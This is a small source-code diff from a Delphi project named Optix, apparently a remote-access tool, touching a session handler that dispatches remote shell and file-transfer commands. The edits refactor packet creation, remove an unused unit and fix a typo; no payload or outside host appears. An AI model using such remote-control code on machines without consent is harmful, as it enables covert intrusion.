@@ -126,7 +126,7 @@ uses
 
   Winapi.Windows,
 
-  Optix.Func.SessionInformation, Optix.Func.LogNotifier, Optix.Thread, Optix.Func.Shell, Optix.ClassesRegistry;
+  Optix.Func.SessionInformation, Optix.Func.LogNotifier, Optix.Thread, Optix.ClassesRegistry;
 // ---------------------------------------------------------------------------------------------------------------------
 
 { TOptixSessionHandlerThread.Initialize }
@@ -362,7 +362,16 @@ begin
     end);
   {$ENDIF}
 
-  AddPacket(TOptixSessionInformation.Create());
+  var ASessionInformation := TOptixSessionInformation.Create();
+  try
+    ASessionInformation.DoAction();
+
+    ///
+    AddPacket(ASessionInformation);
+  except
+    if Assigned(ASessionInformation) then
+      FreeAndNil(ASessionInformation);
+  end;
 end;
 
 { TOptixSessionHandlerThread.Disconnected }
@@ -430,7 +439,7 @@ begin
       // Optix Transfers (Download & Upload)
       end else if AOptixPacket is TOptixCommandTransfer then
         RegisterNewFileTransfer(TOptixCommandTransfer(AOptixPacket))
-      // Shell Coammdns
+      // Shell Commands
       else if AOptixPacket is TOptixCommandShell then begin
         if AOptixPacket is TOptixStartShellInstance then
           RegisterAndStartNewShellInstance(TOptixStartShellInstance(AOptixPacket))
